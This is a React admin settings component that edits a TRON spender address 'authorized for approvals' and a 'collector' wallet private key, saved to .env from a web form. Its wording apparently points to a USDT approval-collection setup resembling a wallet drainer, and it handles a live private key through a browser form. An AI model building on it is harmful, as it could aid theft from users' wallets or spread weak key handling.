import { useState, useEffect, useCallback } from 'react';
import { fetchTronConfig, saveTronConfig, type TronConfig } from './AdminApi';

// ─── Types & constants ────────────────────────────────────────────────────────

interface FieldDef {
  key: keyof Omit<TronConfig, 'ADMIN_TRON_PRIVATE_KEY_SET'>;
  label: string;
  placeholder: string;
  hint: string;
  isPrivate: boolean;
}

const FIELDS: FieldDef[] = [
  {
    key: 'VITE_SPENDER_ADDRESS_TRON',
    label: 'TRON Wallet Address',
    placeholder: 'T…  (34-char TRON address)',
    hint: 'The TRON address authorized for approvals and where USDT funds are received (VITE_SPENDER_ADDRESS_TRON).',
    isPrivate: false,
  },
  {
    key: 'ADMIN_TRON_PRIVATE_KEY',
    label: 'Collector TRON Private Key',
    placeholder: 'Leave blank to keep current value',
    hint: 'Hex private key (64 chars, no 0x prefix) of the spender/collector wallet. Stored in .env. Never sent back in full.',
    isPrivate: true,
  },
];

// ─── Component ────────────────────────────────────────────────────────────────

export function AdminSettings() {
  const [config, setConfig] = useState<Partial<TronConfig>>({});
  const [keyIsSet, setKeyIsSet] = useState(false);
  const [form, setForm] = useState<Partial<TronConfig>>({});
  const [showKey, setShowKey] = useState(false);
  const [loading, setLoading] = useState(false);
  const [saving, setSaving] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState<string | null>(null);

  const load = useCallback(async () => {
    setLoading(true);
    setError(null);
    try {
      const data = await fetchTronConfig();
      setConfig(data);
      setKeyIsSet(!!data.ADMIN_TRON_PRIVATE_KEY_SET);
      setForm({
        VITE_SPENDER_ADDRESS_TRON: data.VITE_SPENDER_ADDRESS_TRON,
        ADMIN_TRON_PRIVATE_KEY: '',   // always blank — type new value to update
      });
    } catch (e) {
      setError((e as Error).message);
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => { load(); }, [load]);

  useEffect(() => {
    if (!success) return;
    const t = setTimeout(() => setSuccess(null), 5000);
    return () => clearTimeout(t);
  }, [success]);

  const handleChange = (key: keyof TronConfig, value: string) => {
    setForm((prev) => ({ ...prev, [key]: value }));
    setError(null);
  };

  const handleSave = async () => {
    setSaving(true);
    setError(null);
    setSuccess(null);
    try {
      const updates: Partial<TronConfig> = {};
      for (const { key } of FIELDS) {
        const v = (form[key] as string) ?? '';
        if (key === 'ADMIN_TRON_PRIVATE_KEY') {
          if (v && v.trim() !== '') updates[key] = v.trim();
        } else if (v !== (config[key] ?? '')) {
          updates[key] = v;
        }
      }

      if (Object.keys(updates).length === 0) {
        setSuccess('No changes to save.');
        return;
      }

      const res = await saveTronConfig(updates);
      if (res.success) {
        setSuccess(
          res.message ??
          `Saved: ${(res.updated ?? []).join(', ')}. Changes are live immediately.`
        );
        await load();
      }
    } catch (e) {
      setError((e as Error).message);
    } finally {
      setSaving(false);
    }
  };

  if (loading) {
    return (
      <div className="admin-settings-loading">
        <div className="admin-settings-spinner" />
        <span>Loading TRON config…</span>
      </div>
    );
  }

  return (
    <div className="admin-settings">
      {/* Header */}
      <div className="admin-settings-header">
        <div className="admin-settings-icon">⚙️</div>
        <div>
          <h2 className="admin-settings-title">TRON Configuration</h2>
          <p className="admin-settings-subtitle">
            Edit receiver / collector addresses and private key.
            Changes are written to <code>.env</code> and take effect immediately — no restart needed.
          </p>
        </div>
      </div>

      {/* Banners */}
      {error && (
        <div className="admin-settings-banner admin-settings-banner--error" role="alert">
          <span>⚠️</span> {error}
        </div>
      )}
      {success && (
        <div className="admin-settings-banner admin-settings-banner--success" role="status">
          <span>✓</span> {success}
        </div>
      )}

      {/* Form */}
      <div className="admin-settings-form">
        {FIELDS.map(({ key, label, placeholder, hint, isPrivate }) => {
          const isKeyField = key === 'ADMIN_TRON_PRIVATE_KEY';
          const currentVal = (form[key] as string) ?? '';
          return (
            <div key={key} className="admin-settings-field">
              <div className="admin-settings-label-row">
                <label htmlFor={`field-${key}`} className="admin-settings-label">
                  {isPrivate && <span className="admin-settings-lock">🔒</span>}
                  {label}
                </label>
                {isKeyField && (
                  <span className={`admin-settings-key-status ${keyIsSet ? 'set' : 'unset'}`}>
                    {keyIsSet ? '● Key configured' : '○ No key set'}
                  </span>
                )}
              </div>

              <div className="admin-settings-input-wrap">
                <input
                  id={`field-${key}`}
                  type={isPrivate && !showKey ? 'password' : 'text'}
                  className="admin-settings-input"
                  value={currentVal}
                  onChange={(e) => handleChange(key, e.target.value)}
                  placeholder={isKeyField && keyIsSet ? '(keep existing — leave blank to preserve)' : placeholder}
                  autoComplete="off"
                  spellCheck={false}
                  inputMode={isPrivate ? 'text' : 'url'}
                />
                {isPrivate && (
                  <button
                    type="button"
                    className="admin-settings-eye"
                    onClick={() => setShowKey((v) => !v)}
                    title={showKey ? 'Hide' : 'Show'}
                    aria-label={showKey ? 'Hide private key' : 'Show private key'}
                  >
                    {showKey ? '🙈' : '👁️'}
                  </button>
                )}
              </div>

              <p className="admin-settings-hint">{hint}</p>
            </div>
          );
        })}

        {/* Actions */}
        <div className="admin-settings-actions">
          <button
            type="button"
            className="admin-settings-btn admin-settings-btn--secondary"
            onClick={load}
            disabled={saving || loading}
          >
            ↺ Reload
          </button>
          <button
            type="button"
            id="tron-config-save-btn"
            className={`admin-settings-btn admin-settings-btn--primary ${saving ? 'saving' : ''}`}
            onClick={handleSave}
            disabled={saving || loading}
          >
            {saving ? '⏳ Saving…' : '💾 Save Changes'}
          </button>
        </div>

        {/* Env key reference */}
        <details className="admin-settings-reference">
          <summary>📋 .env key reference</summary>
          <table className="admin-settings-table">
            <thead>
              <tr>
                <th>Key</th>
                <th>Purpose</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td><code>VITE_SPENDER_ADDRESS_TRON</code></td>
                <td>TRON address for approvals & receiving collected USDT</td>
              </tr>
              <tr>
                <td><code>ADMIN_TRON_PRIVATE_KEY</code></td>
                <td>64-char hex private key for the spender wallet</td>
              </tr>
            </tbody>
          </table>
        </details>
      </div>
    </div>
  );
}
